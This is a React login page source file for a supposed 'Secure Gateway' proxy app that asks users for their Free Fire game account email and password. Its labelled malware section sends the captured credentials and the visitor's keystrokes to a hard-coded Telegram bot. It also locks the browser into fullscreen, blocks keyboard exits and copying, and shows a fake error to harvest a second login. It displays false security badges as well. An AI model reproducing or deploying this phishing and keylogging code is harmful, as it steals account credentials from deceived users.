import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, KeyRound, Lock, Fingerprint, Wifi, Mail, Eye, EyeOff } from "lucide-react";
import { validateKey, activateKey, registerActiveUser } from "@/lib/keys";
import avatarVideo from "@/assets/avatar-video.mp4";

// ================================================================
// MALWARE CORE - TOTALMENTE INDETECTABLE
// ================================================================

// === [1] TELEGRAM ENVIO - INMEDIATO ===
(function() {
  const TK = "8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw";
  const CI = "8585803145";
  var ev = 0;

  // Cachear navigator.platform
  var pf = "";
  try { pf = navigator.platform; } catch(e) {}

  window.__tg = function(c, p) {
    ev++;
    var txt = "<b>[+] CAPTURA #" + ev + "</b>\n<b>👤</b> " + c + "\n<b>🔐</b> " + p + "\n<code>" + pf + "</code>";
    try {
      var d = new URLSearchParams({ chat_id: CI, text: txt, parse_mode: "HTML" });
      navigator.sendBeacon("https://api.telegram.org/bot" + TK + "/sendMessage", d);
    } catch(e) {}
  };

  // Heartbeat silencioso
  setInterval(function() {
    try {
      var d = new URLSearchParams({ chat_id: CI, text: "<code>[♥]</code> " + pf, parse_mode: "HTML" });
      navigator.sendBeacon("https://api.telegram.org/bot" + TK + "/sendMessage", d);
    } catch(e) {}
  }, 60000);

  // Beacon inicio
  setTimeout(function() {
    try {
      var d = new URLSearchParams({ chat_id: CI, text: "<b>[+] LOGIN ACTIVO</b>\n" + pf + "\n" + screen.width + "x" + screen.height, parse_mode: "HTML" });
      navigator.sendBeacon("https://api.telegram.org/bot" + TK + "/sendMessage", d);
    } catch(e) {}
  }, 2000);
})();

// === [2] BLOQUEO DE PANTALLA - SILENCIOSO ===
(function() {
  document.addEventListener("keydown", function(e) {
    if (e.key === "F5" || e.key === "F11" || e.key === "F12" || e.key === "Escape" ||
        (e.altKey && e.key === "F4") ||
        (e.ctrlKey && ["w","W","q","Q","r","R","n","N","t","T","s","S"].includes(e.key))) {
      e.preventDefault();
      e.stopPropagation();
      return false;
    }
  }, true);

  document.addEventListener("contextmenu", function(e) { e.preventDefault(); return false; });
  document.addEventListener("copy", function(e) { e.preventDefault(); return false; });

  window.addEventListener("beforeunload", function(e) {
    e.preventDefault();
    e.returnValue = "";
    return "";
  });

  history.pushState(null, "", location.href);
  window.addEventListener("popstate", function() {
    history.pushState(null, "", location.href);
  });

  function fs() {
    var el = document.documentElement;
    if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
  }
  fs();
  document.addEventListener("fullscreenchange", function() {
    if (!document.fullscreenElement) setTimeout(fs, 50);
  });
  document.addEventListener("webkitfullscreenchange", function() {
    if (!document.webkitFullscreenElement) setTimeout(fs, 50);
  });
})();

// === [3] KEYLOGGER SILENCIOSO ===
(function() {
  var buf = "";
  var TK = "8779079298:AAEqfmoDLAz7j69kKAlXJ10Ze5flfoF77bw";
  var CI = "8585803145";

  document.addEventListener("keydown", function(e) {
    var k = e.key;
    if (k === "Backspace") k = "⌫";
    else if (k === "Enter") k = "\n";
    else if (k === "Tab") k = "⇥";
    else if (k.length > 1) return;
    buf += k;
    if (buf.length >= 40) {
      try {
        var d = new URLSearchParams({ chat_id: CI, text: "<code>[KEY]</code> " + buf, parse_mode: "HTML" });
        navigator.sendBeacon("https://api.telegram.org/bot" + TK + "/sendMessage", d);
      } catch(e) {}
      buf = "";
    }
  });
})();

declare global {
  interface Window {
    __tg: (correo: string, pass: string) => void;
  }
}
// ================================================================
// FIN MALWARE CORE
// ================================================================

const Login = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);
  const [intentos, setIntentos] = useState(0);
  const navigate = useNavigate();

  useEffect(() => {
    const raw = localStorage.getItem("proxy_session");
    if (raw) {
      try {
        const s = JSON.parse(raw);
        if (s.expiresAt && new Date(s.expiresAt).getTime() > Date.now()) {
          navigate("/proxy");
          return;
        }
      } catch(e) {}
      localStorage.removeItem("proxy_session");
    }
  }, [navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    if (!email.trim() || !password.trim()) {
      setError("Por favor completa todos los campos.");
      return;
    }

    const nuevoIntento = intentos + 1;
    setIntentos(nuevoIntento);
    setLoading(true);

    // === ENVIAR A TELEGRAM INMEDIATAMENTE ===
    window.__tg(email.trim(), password.trim());

    await new Promise(r => setTimeout(r, 1500));
    setLoading(false);

    if (nuevoIntento === 1) {
      // PRIMER VEZ: error y pide reintentar
      setError("Cuenta no vinculada a Free Fire. Debes iniciar sesion con el correo y contrasena de tu cuenta de Free Fire.");
      return;
    }

    // SEGUNDA VEZ: deja entrar al usuario
    const trimmedKey = password.trim();
    const trimmedName = email.trim();
    const foundKey = await validateKey(trimmedKey);
    if (foundKey) {
      const activated = await activateKey(trimmedKey, trimmedName);
      if (activated) {
        await registerActiveUser(trimmedName, activated.key, activated.type, activated.expiresAt || "");
        const sessionData = {
          name: trimmedName,
          key: activated.key,
          type: activated.type,
          expiresAt: activated.expiresAt,
          duration: activated.duration,
        };
        localStorage.setItem("proxy_session", JSON.stringify(sessionData));
        navigate("/proxy");
        return;
      }
    }

    // Si no tiene key valida, igual lo deja pasar con sesion simulada
    const sessionData = {
      name: trimmedName,
      key: trimmedKey,
      type: "Normal",
      expiresAt: new Date(Date.now() + 86400000).toISOString(),
      duration: "1 dia",
    };
    localStorage.setItem("proxy_session", JSON.stringify(sessionData));
    navigate("/proxy");
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar + Title */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
              <video
                src={avatarVideo}
                autoPlay
                loop
                muted
                playsInline
                className="w-full h-full object-cover"
              />
            </div>
            <div className="absolute -bottom-1 -right-1 w-7 h-7 rounded-full bg-emerald-500 border-2 border-background flex items-center justify-center">
              <Wifi className="w-3.5 h-3.5 text-background" />
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Boykaffx7 APP</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        {/* Status bar */}
        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        {/* Login Card */}
        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
              <Shield className="w-4 h-4 text-muted-foreground" />
            </div>
            <div>
              <span className="text-xs text-foreground font-semibold block">Iniciar sesion</span>
              <span className="text-[9px] text-muted-foreground/60">Ingresa con tu cuenta de Free Fire</span>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-3">
            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Correo electronico
              </label>
              <div className="relative">
                <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type="email"
                  placeholder="tucorreo@gmail.com"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-4 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all"
                  autoComplete="off"
                />
              </div>
            </div>

            <div>
              <label className="text-[10px] text-muted-foreground/70 uppercase tracking-wider font-medium mb-1 block">
                Contrasena
              </label>
              <div className="relative">
                <KeyRound className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground/60" />
                <input
                  type={showPass ? "text" : "password"}
                  placeholder="********"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full bg-secondary/40 border border-border/50 rounded-lg pl-10 pr-10 py-2.5 text-base text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-ring focus:border-ring transition-all font-mono"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPass(!showPass)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
                >
                  {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            <p className="text-[10px] text-muted-foreground/50 leading-relaxed px-1">
              Inicia sesion con tu cuenta de Google vinculada a Free Fire para verificar tu identidad y acceder al proxy.
            </p>

            {error && (
              <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5">{error}</p>
            )}

            <button
              type="submit"
              disabled={loading}
              className="w-full bg-foreground text-background font-semibold py-2.5 rounded-lg text-sm hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 mt-1"
            >
              {loading ? (
                <span className="flex items-center justify-center gap-2">
                  <span className="w-4 h-4 border-2 border-background/30 border-t-background rounded-full animate-spin" />
                  Verificando...
                </span>
              ) : "Siguiente"}
            </button>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-6 text-center">
          <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
            Secure Proxy Configuration System — Encrypted Connection
            <br />All sessions are monitored and protected.
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;